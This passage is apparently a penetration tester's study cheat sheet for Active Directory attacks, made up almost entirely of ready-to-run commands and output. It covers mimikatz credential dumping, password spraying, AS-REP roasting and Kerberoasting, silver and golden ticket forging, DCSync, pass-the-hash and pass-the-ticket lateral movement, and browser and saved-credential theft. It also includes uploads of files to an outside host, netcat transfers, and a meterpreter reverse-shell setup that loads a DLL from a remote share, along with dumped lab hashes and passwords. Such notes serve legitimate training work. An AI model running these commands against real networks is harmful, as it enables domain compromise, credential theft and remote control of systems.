Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

### Object permission enumeration

- Enumerate the ACEs applied to a user

```powershell
Get-ObjectAcl -Identity stephanie
```

- Convert an ObjectSID to a name

```powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```

- Convert a SecurityIdentifier to a name with PowerView

```powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
```

- Enumerate the ACL for a management group

```powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

- Convert every SID that has GenericAll on the management group

```powershell
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```

### Domain share enumeration

- Query domain shares with PowerView

```powershell
Find-DomainShare
```

## Automated Enumeration

### Collecting data with SharpHound

[https://github.com/SpecterOps/SharpHound/releases](https://github.com/SpecterOps/SharpHound/releases)

- Import sharphound

```powershell
Import-Module .\Sharphound.ps1
```

- Run SharpHound to collect domain data

```powershell
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\
```

### Collecting data with BloodHound.py

```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

### Analysing data with BloodHound

- Install Docker

```bash
sudo apt update
sudo apt install -y docker.io docker-compose
 
sudo systemctl enable --now docker
```

- Install bloodhound

```bash
cd ~/bloodhound
 
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-arm64.tar.gz
 
tar -xvzf bloodhound-cli-linux-arm64.tar.gz
chmod +x bloodhound-cli
 
./bloodhound-cli version
```

- Run BloodHound

```bash
./bloodhound-cli install
```

- Shut down

```bash
./bloodhound-cli containers down --volumes
```

# Active Directory Authentication Attacks

## Active Directory Authentication

### Cached AD credentials

- Run mimikatz / allow interaction with processes owned by other accounts

```console
.\mimikatz.exe
privilege::debug
```

- Dump hashes for every user that has logged on to the server

```text
sekurlsa::logonpasswords
```

- Show tickets held in memory

```text
sekurlsa::tickets
```

## Performing Attacks Against AD Authentication

### Password attacks

- Check the account policy

```cmd
net accounts
```

- Password spray with netexec

```bash
netexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

### AS-REP Roasting

An attack against accounts with Kerberos "pre-authentication" disabled: obtain the AS-REP response without a password and crack it offline.

Requires only a domain user account.

- Perform AS-REP roasting with GetNPUsers

```bash
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```

- Get dave's AS-REP hash with Rubeus

```cmd
.\Rubeus.exe asreproast /nowrap
```

- Crack the AS-REP hash

```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Using NXC

- Automate AS-REP roasting with nxc

```bash
nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt
hashcat -m18200 output.txt wordlist
```

### Kerberoasting

Request a ticket (TGS-REP) for a service account with an SPN registered, then crack the service account's password hash offline.

- Perform a kerberoast attack with Rubeus

```cmd
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

- Perform Kerberoasting from Linux with impacket-GetUserSPNs

```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

- Crack the hash

```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Using NXC

- Automate kerberoasting with nxc

```bash
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
hashcat -m13100 output.txt wordlist.txt
```

### Silver Tickets

Forge a service ticket directly with the service account's password hash, then access that specific service with the privileges you choose.

- Use mimikatz to obtain the NTLM hash of iis_service, the account mapped to the target SPN

```text
privilege::debug
sekurlsa::logonpasswords
```

- Check the domain SID

```cmd
whoami /user
```

- Forge a service ticket as jeffadmin and inject it into the current session

```text
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

- List tickets

```text
klist
```

- Access the SMB share

```powershell
iwr -UseDefaultCredentials http://web04
```

### Domain Controller Synchronization

With a Domain Admin account, impersonate the domain controller and send a replication request; the DC then hands over every user's password hash.

- Perform a dcsync attack with mimikatz to obtain dave's credentials

```console
.\mimikatz.exe
lsadump::dcsync /user:corp\dave
```

- Perform a dcsync attack with secretsdump to obtain dave's NTLM hash

```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

# Active Directory Lateral Movement

## AD Lateral Movement Techniques

### WMI and WinRM

- wmic command (port 135)

```cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

- winrs (port 5985)

```cmd
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
```

### PsExec

Requirements: local Administrators group, ADMIN$ share available, File and Printer Sharing enabled → the last two are on by default

- Get an interactive shell on the target with PsExec

```cmd
.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```

### Pass the Hash

- Pass an NTLM hash with Impacket wmiexec

```bash
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

### Overpass the Hash

- Create a process using another user's NTLM password hash

```text
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

- Open a remote connection using Kerberos

```cmd
.\PsExec.exe \\files04 cmd
```

### Pass the Ticket from Windows

mimikatz

- Export all tickets from an elevated context

```console
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

- Pass the Ticket

```console
mimikatz.exe  
privilege::debug  
kerberos::ptt "C:\\Users\\Administrator\\Desktop\\[0;5b0ba]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

- Create a remote interactive PowerShell session

```powershell
powershell
Enter-PSSession -ComputerName DC01
```

Rubeus

- Dump every ticket from an elevated context

```cmd
Rubeus.exe dump /nowrap
```

- Pass the Ticket

```cmd
Rubeus.exe ptt /ticket:<BASE64_TICKET>
```

- Or use a `.kirbi` file:

```cmd
Rubeus.exe ptt /ticket:C:\path\john.kirbi
```

- Create a remote interactive PowerShell session

```powershell
powershell
Enter-PSSession -ComputerName DC01
```

### Pass the Ticket from Linux

- Check whether the host is AD-joined

```console
realm list
or
ps -ef | grep -i "winbind\|sssd"
```

keytab (Kerberos authentication without entering a password)

- Find keytabs

```bash
find / -name '*keytab*' -ls 2>/dev/null
```

- Inspect keytab information

```bash
klist -k -t user.keytab
```

- Obtain a TGT with the keytab

```console
kinit <USER>@<REALM> -k -t <KEYTAB>
klist
```

- Extract hashes from the keytab

```bash
python3 keytabextract.py <FILE>
hashcat -a 0 -m 1000 a738f92b3c08b424ec2d99589a9cce60 /usr/share/wordlists/rockyou.txt
```

ccache (the current user's Kerberos ticket cache)

- Check the current ccache

```bash
env | grep -i krb5
```

- Find ccache files

```console
ls -la /tmp
or
find /tmp -name 'krb5cc_*' 2>/dev/null
```

- Use another ccache

```console
cp /tmp/krb5cc_<USER> .
export KRB5CCNAME=/path/krb5cc_<USER>
```

Using Linux Kerberos tools

- `-k`: use Kerberos authentication

```bash
smbclient //<HOST>/<SHARE> -k -c ls
impacket-wmiexec <HOST> -k
evil-winrm -i <HOST> -r <REALM>
```

### Golden Ticket

Parent-child domain trust golden ticket abuse

- Extract the domain SIDs
  - DC01: S-1-5-21-1190331060-1711709193-932631991
  - DC02: S-1-5-21-4168247447-1722543658-2110108262

```console
C:\Windows\system32> nltest /domain_trusts /v
List of domain trusts:
    0: POSEIDON poseidon.yzx (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
       Dom Guid: b77f9b23-9f53-4afc-a027-b38929b466f0
       Dom Sid: S-1-5-21-1190331060-1711709193-932631991
    1: sub sub.poseidon.yzx (NT 5) (Forest: 0) (Primary Domain) (Native)
       Dom Guid: 5cdf1d22-5e08-4243-b8b1-32651fe49630
       Dom Sid: S-1-5-21-4168247447-1722543658-2110108262
The command completed successfully
```

Extract the krbtgt NTLM hash

- krbtgt:502:aad3b435b51404eeaad3b435b51404ee:80f23a248d39b8cb93df3a4a2f4199a1:::
- krbtgt:aes256-cts-hmac-sha1-96:b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2

```console
┌──(kali🎃kali)-[~/oscp]
└─$ impacket-secretsdump eric.wallows:EricLikesRunning800@192.168.170.162
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
[*] Target system bootKey: 0x6147911c9221199f60a625e5011aafde
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8fea81a19d172de0c445c8072b9a1697:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<SNIP>
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3bcdd818f7ec942ac91aa30d8db71927:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:80f23a248d39b8cb93df3a4a2f4199a1:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<SNIP>
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e2786e98a3205f9085ef7071d992422f735ce704f4ba5c29f65f25beed348228
Administrator:aes128-cts-hmac-sha1-96:b6593732b7ab7cecd59afadef15b4315
Administrator:des-cbc-md5:e0e03d58a15d315e
krbtgt:aes256-cts-hmac-sha1-96:b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2
krbtgt:aes128-cts-hmac-sha1-96:b5d83edef61d3c3799047e208e13b2c7
krbtgt:des-cbc-md5:b95ee5a11c10d989
```

- Create a golden ticket (using nthash)
  - ticketer.py -nthash KRBTGTHASH -domain CHILDFQDN -domain-sid CHILDDOMAINSID -extra-sid PARENTDOMAINSID- hacker

```console
┌──(kali🎃kali)-[~/oscp]
└─$ impacket-ticketer -nthash 80f23a248d39b8cb93df3a4a2f4199a1 -domain sub.poseidon.yzx -domain-sid S-1-5-21-4168247447-1722543658-2110108262 -extra-sid S-1-5-21-1190331060-1711709193-932631991 Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sub.poseidon.yzx/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

- Create a golden ticket (using aesKey)

```console
┌──(kali🎃kali)-[~/oscp]
└─$ impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 -domain sub.poseidon.yzx -domain-sid S-1-5-21-4168247447-1722543658-2110108262 -extra-sid S-1-5-21-1190331060-1711709193-932631991-519 Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sub.poseidon.yzx/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

- Load the ticket

```console
┌──(kali🎃kali)-[~/oscp]
└─$ export KRB5CCNAME=Administrator.ccache
```

- Connect to DC01 with the ticket

```console
┌──(kali🎃kali)-[~/oscp]
└─$ psexec.py sub.poseidon.yzx/Administrator@DC01.poseidon.yzx -k -no-pass
```

raiseChild.py

- Automate the golden ticket with raiseChild.py

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

## Active Directory Privilege Escalation

### Vulnerability scanning with certipy-ad

```bash
# Scan for vulnerabilities
certipy-ad find -u 'Ryan.Cooper' -p 'NuclearMosquito3' -dc-ip 10.129.8.240 -target-ip 10.129.8.240 -vulnerable
# Review the findings
cat 20260216030602_Certipy.txt
```

# Techniques

## Shell Spawning

- shell spawning

```bash
script -qc /bin/bash /dev/null
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

- Get a full TTY shell

```console
# On Kali
CTRL+z
stty raw -echo
fg
stty -a
 
# On Target
export SHELL=bash
export TERM=xterm256-color  OR  export TERM=xterm
stty rows 38
stty columns 116
```

## File Transfer

### python upload server

- Start the upload server

```bash
pip3 install uploadserver
python3 -m uploadserver 8000
```

- Upload a file

```cmd
curl.exe http://192.168.45.190:8080/upload -F files=@C:\Users\files.zip
```

### File transfer with netcat

- Listening on port 8000

```bash
nc -l -p 8000 > SharpKatz.exe
```

- Send a file to the compromised machine

```bash
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

## Reading file metadata

- exiftool

```bash
exiftool *.pdf | grep Author
```

## Enabling Windows remote access

### winrm

- Enable winrm

```cmd
winrm quickconfig -q -force
winrm set winrm/config/service @{AllowUnencrypted="true"}
winrm set winrm/config/service/auth @{Basic="true"}
net start winrm
```

### RDP

- Enable RDP

```console
*Evil-WinRM* PS C:\Users\o.foller\Documents> reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
The operation completed successfully.
 
*Evil-WinRM* PS C:\Users\o.foller\Documents> netsh advfirewall set rule group="remote desktop" new enable=Yes
The following command was not found: advfirewall set rule "group=remote desktop" new enable=Yes.
*Evil-WinRM* PS C:\Users\o.foller\Documents>
*Evil-WinRM* PS C:\Users\o.foller\Documents> net localgroup "Remote Desktop Users" o.foller /add
The command completed successfully.
```

- Connect over RDP

```bash
xfreerdp3 /v:<IP> /u:<USERNAME> /p:'<PASSWORD>' +clipboard /dynamic-resolution
```

## Custom Wordlists

### username-anarchy

- install

```bash
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```

- Generate a wordlist

```bash
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

### cupp

- Generate a password wordlist
  - Enabling CUPP mode makes CUPP ask a series of questions about the target

```bash
cupp -i
```

## Password Collection

### LaZagne

- Credential collection tool

```cmd
.\lazagne.exe all
```

### SharpChrome

- Retrieve credentials saved in Chrome

```cmd
.\SharpChrome.exe logins /unprotect
```

### SessionGopher

- Extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY and RDP credentials

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

## Metasploit

### meterpreter

- meterpreter reverse shell connection

```console
# msfconsole
use exploit/windows/smb/smb_delivery
set payload windows/x64/meterpreter/reverse_tcp
set lhost tun0set lport 446
exploit
 
# Run this command on Reverse shell side.
powershell -ep bypass "rundll32.exe \\10.10.14.128\oWLczM\test.dll,0"
```

### Post Exploit

- post/multi/recon/local_exploit_suggester
  - Search for possible privilege escalation paths

```console
msf exploit(windows/smb/smb_delivery) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > show options
 
Module options (post/multi/recon/local_exploit_suggester):
 
   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
 
 
View the full module info with the info, or info -d command.
```
